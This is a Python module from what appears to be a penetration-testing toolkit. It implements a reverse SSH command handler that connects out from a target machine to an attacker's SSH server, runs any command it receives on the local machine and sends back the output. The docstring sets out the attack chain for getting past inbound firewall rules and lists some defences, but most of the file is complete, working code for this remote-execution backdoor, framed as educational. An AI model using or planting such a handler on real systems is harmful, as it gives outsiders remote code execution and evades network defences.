# topic: SSH Tools
# title: SSH Command and Response Handler
# priority: 2

"""
ssh_command_handler.py - Reverse SSH Command Handler
======================================================
Connects outbound to an SSH server and waits for the server to
send commands, executing them locally and returning the output.

This is the REVERSE of the normal SSH pattern:
  Normal SSH  : client sends commands, server executes them
  This module : server sends commands, client executes them locally

HOW IT WORKS
-------------
1. This client connects outbound to an SSH server
2. The SSH server sends a command through the channel
3. This client executes the command on the LOCAL machine
4. Output is sent back to the server
5. Repeat until the server closes the channel

WHY THIS PATTERN EXISTS
------------------------
In penetration testing, target machines are often behind firewalls
that block all INBOUND connections but allow OUTBOUND connections
(e.g. outbound TCP 22 for SSH is commonly permitted).

By connecting outbound FROM the target TO the attacker's SSH server,
we bypass inbound firewall rules entirely. The attacker's server
then sends commands through the established outbound connection.

This is conceptually similar to a reverse shell but tunnelled
through an encrypted SSH connection rather than a raw TCP socket.

ATTACK CHAIN EXAMPLE
---------------------
1. Attacker runs an SSH server (see ssh_server.py module)
2. Target machine runs this module, connecting to attacker's server
3. Attacker's server sends: "whoami"
4. This module executes whoami locally, returns output
5. Attacker now has remote code execution through the firewall

DEFENCES
---------
  - Egress filtering on outbound SSH (port 22)
  - Application whitelisting prevents unknown executables
  - Network monitoring for unusual outbound SSH connections
  - SSH honeypots to detect and log connection attempts

KNOWN SECURITY RISK - AutoAddPolicy
-------------------------------------
AutoAddPolicy() accepts any host key without verification.
Acceptable in isolated lab environments only.

EDUCATIONAL USE ONLY.
Only use against systems you own or have explicit written permission
to test. Unauthorised access is illegal in most jurisdictions.

Requirements:
    pip install paramiko
"""

import os
import sys
import subprocess
import shlex
from typing import Optional

IS_WINDOWS = os.name == "nt"

try:
    import paramiko
    PARAMIKO_AVAILABLE = True
except ImportError:
    PARAMIKO_AVAILABLE = False

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
DEFAULT_PORT    = 22
CONNECT_TIMEOUT = 10     # Seconds before connection attempt times out
COMMAND_TIMEOUT = 30     # Seconds before a command execution times out
BUFFER_SIZE     = 4096   # Bytes per channel read


# ---------------------------------------------------------------------------
# Command execution
# ---------------------------------------------------------------------------

def execute_local_command(command: str) -> str:
    """
    Execute a shell command on the LOCAL machine and return the output.

    Uses subprocess with shell=False for security - the command is
    tokenized by shlex.split() into a list so the OS exec's the binary
    directly without shell interpretation.

    On Windows, shlex.split() handles quoted arguments correctly for
    most commands. For Windows-specific built-in commands (dir, cls,
    type) that only exist in cmd.exe, we fall back to shell=True with
    a fixed command string - but only for the built-in commands we
    explicitly whitelist.

    Parameters
    ----------
    command : str   Shell command string to execute locally.

    Returns
    -------
    Combined stdout and stderr output as a string.
    """
    # Windows built-in commands that require cmd.exe
    WINDOWS_BUILTINS = {
        "dir", "cls", "type", "copy", "move", "del",
        "mkdir", "rmdir", "echo", "set", "cd",
    }

    try:
        # Check if this is a Windows built-in command
        base_cmd = command.strip().split()[0].lower() if command.strip() else ""

        if IS_WINDOWS and base_cmd in WINDOWS_BUILTINS:
            # Use cmd.exe for built-in commands
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=COMMAND_TIMEOUT,
            )
        else:
            # Use tokenized args with shell=False for security
            args = shlex.split(command)
            result = subprocess.run(
                args,
                shell=False,
                capture_output=True,
                text=True,
                timeout=COMMAND_TIMEOUT,
            )

        output = result.stdout
        if result.stderr:
            output += f"\n[stderr]\n{result.stderr}"
        return output.rstrip() if output else "[no output]"

    except subprocess.TimeoutExpired:
        return f"[!] Command timed out after {COMMAND_TIMEOUT}s"

    except FileNotFoundError:
        return f"[!] Command not found: {command.split()[0]}"

    except OSError as exc:
        return f"[!] Execution error: {exc}"


# ---------------------------------------------------------------------------
# Core handler
# ---------------------------------------------------------------------------

def run_command_handler(
    host: str,
    port: int,
    username: str,
    password: str,
) -> None:
    """
    Connect to an SSH server and handle incoming commands.

    Opens an interactive SSH channel, reads commands sent by the
    server, executes them locally, and sends back the output.

    The channel.recv() loop continues until:
      - The server closes the channel
      - A network error occurs
      - The user presses Ctrl+C

    Parameters
    ----------
    host     : str   SSH server hostname or IP (attacker's server).
    port     : int   SSH server port.
    username : str   SSH username.
    password : str   SSH password.
    """
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        print(f"  [*] Connecting to {host}:{port} as {username}...")
        client.connect(
            hostname=host,
            port=port,
            username=username,
            password=password,
            timeout=CONNECT_TIMEOUT,
            allow_agent=False,
            look_for_keys=False,
        )
        print(f"  [+] Connected. Waiting for commands from server...")

    except paramiko.AuthenticationException:
        print(f"  [!] Authentication failed for {username}@{host}")
        return

    except paramiko.SSHException as exc:
        print(f"  [!] SSH error: {exc}")
        return

    except OSError as exc:
        print(f"  [!] Network error: {exc}")
        if IS_WINDOWS and "10061" in str(exc):
            print(f"      Connection refused - is the SSH server running on {host}:{port}?")
        return

    try:
        # Open an interactive channel to receive commands
        channel = client.get_transport().open_session()
        channel.get_pty()
        channel.invoke_shell()

        while True:
            # Read command from server
            if channel.recv_ready():
                command = channel.recv(BUFFER_SIZE).decode(
                    "utf-8", errors="replace"
                ).strip()

                if not command:
                    continue

                print(f"  [*] Received command: {command}")

                # Execute locally and send output back
                output = execute_local_command(command)
                print(f"  [*] Sending output ({len(output)} chars)")

                channel.send(output + "\n")

            # Check if server closed the channel
            if channel.closed or channel.exit_status_ready():
                print("  [*] Server closed the channel.")
                break

    except KeyboardInterrupt:
        print("\n  [*] Handler stopped by user.")

    except paramiko.SSHException as exc:
        print(f"  [!] Channel error: {exc}")

    except OSError as exc:
        print(f"  [!] Socket error: {exc}")

    finally:
        client.close()
        print("  [*] Connection closed.")


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main() -> None:
    """
    Prompt for SSH server details and start the command handler.
    """
    print("\n  SSH Command and Response Handler")
    print("  " + "-" * 33)
    print("  [!] EDUCATIONAL USE ONLY.")
    print("  [!] This module executes commands received from a remote server.")
    print("  [!] Only connect to servers you own or are authorised to use.")
    print("  [*] Enter 0 at any prompt to cancel.\n")

    if not PARAMIKO_AVAILABLE:
        print("  [!] Paramiko is not installed.")
        print("      Run: pip install paramiko")
        return

    # --- Host ---
    host = input("  SSH server host (IP or hostname): ").strip()
    if not host or host == "0":
        return

    # --- Port ---
    raw_port = input(f"  SSH port [{DEFAULT_PORT}]: ").strip()
    if raw_port == "0":
        return
    if raw_port:
        if not raw_port.isdigit():
            print("  [!] Port must be a number.")
            return
        port = int(raw_port)
        if not (1 <= port <= 65535):
            print("  [!] Port must be between 1 and 65535.")
            return
    else:
        port = DEFAULT_PORT

    # --- Username ---
    username = input("  Username: ").strip()
    if not username or username == "0":
        return

    # --- Password ---
    try:
        import getpass
        password = getpass.getpass("  Password: ")
    except (KeyboardInterrupt, EOFError):
        print("\n  Cancelled.")
        return

    if not password:
        print("  [!] Password cannot be empty.")
        return

    # --- Confirm ---
    print(f"\n  Summary:")
    print(f"    Server : {host}:{port}")
    print(f"    User   : {username}")
    print(f"\n  This machine will execute commands sent by the remote server.")

    confirm = input("\n  Start handler? (y/n): ").strip().lower()
    if confirm != "y":
        print("  Cancelled.")
        return

    run_command_handler(host, port, username, password)


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

if __name__ == "__main__":
    main()